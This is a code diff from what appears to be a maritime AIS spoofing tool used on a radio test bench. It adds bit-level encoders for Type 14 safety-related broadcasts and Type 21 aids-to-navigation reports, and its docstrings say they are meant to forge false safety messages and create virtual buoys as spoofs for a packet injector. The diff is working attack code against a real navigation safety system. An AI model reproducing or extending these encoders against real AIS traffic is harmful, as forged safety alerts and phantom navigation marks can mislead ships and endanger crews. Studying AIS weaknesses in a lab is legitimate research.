@@ -116,6 +116,46 @@ def _sixbit_str(s, nchars):
     return out
 
 
+def encode_type14(src_mmsi, text="SECURITE TEST"):
+    """Type 14 safety-related broadcast message. SINGLE-SLOT when the text is short: 40-bit header +
+    up to 21 six-bit chars, padded to fill 168 bits, so it transmits fine on the single-slot injector.
+    Forge a false safety broadcast (same broadcast-provenance gap demonstrated on Type 8)."""
+    b = ""
+    b += _bits(14, 6); b += _bits(0, 2); b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                       # spare
+    b += _sixbit_str(text, 21)             # safety text: 21 chars = 126 bits (40+126=166)
+    b = (b + "0" * 168)[:168]              # pad to a single 168-bit slot
+    assert len(b) == 168, f"Type 14 (short) must be 168 bits, got {len(b)}"
+    return b
+
+
+def encode_type21(mmsi, name="", lat=0.0, lon=0.0, aton_type=24, virtual=1, epfd=7, second=60):
+    """Type 21 aids-to-navigation report (a spoofed / virtual buoy or beacon). WARNING: the base
+    message is 272 bits = TWO slots, because the name is a mandatory 120-bit field. Like Type 5 it
+    does NOT fit the single-slot injector and will not reach the air intact on this bench (Type 5 is
+    confirmed 0-transmit). Provided for completeness and for a future multi-slot injector; on this
+    rig, Message 21 belongs in the not-effectively-testable set with Message 5, same root cause.
+    Set virtual=1 for a purely-synthetic AtoN (no physical mark), the cleanest spoof."""
+    b = ""
+    b += _bits(21, 6); b += _bits(0, 2); b += _bits(mmsi, 30)
+    b += _bits(aton_type, 5)                              # type of aid to navigation
+    b += _sixbit_str(name, 20)                            # name of AtoN (120 bits)
+    b += _bits(1, 1)                                      # position accuracy
+    b += _bits(int(round(lon * 600000.0)), 28)            # longitude (signed)
+    b += _bits(int(round(lat * 600000.0)), 27)            # latitude  (signed)
+    b += _bits(0, 30)                                     # dimension / reference for position
+    b += _bits(epfd, 4)                                   # type of EPFD
+    b += _bits(second, 6)                                 # UTC second
+    b += _bits(0, 1)                                      # off-position indicator
+    b += _bits(0, 8)                                      # AtoN status (regional/reserved)
+    b += _bits(0, 1)                                      # RAIM
+    b += _bits(virtual, 1)                                # virtual AtoN flag
+    b += _bits(0, 1)                                      # assigned-mode flag
+    b += _bits(0, 1)                                      # spare
+    assert len(b) == 272, f"Type 21 base must be 272 bits (2 slots), got {len(b)}"
+    return b
+
+
 def encode_type24_a(mmsi, shipname=""):
     """Type 24 Part A (static data report): 168 bits, ONE slot. Carries just the ship name.
     Use this + encode_type24_b as a drop-in identity-forgery substitute for Type 5: Type 5 is
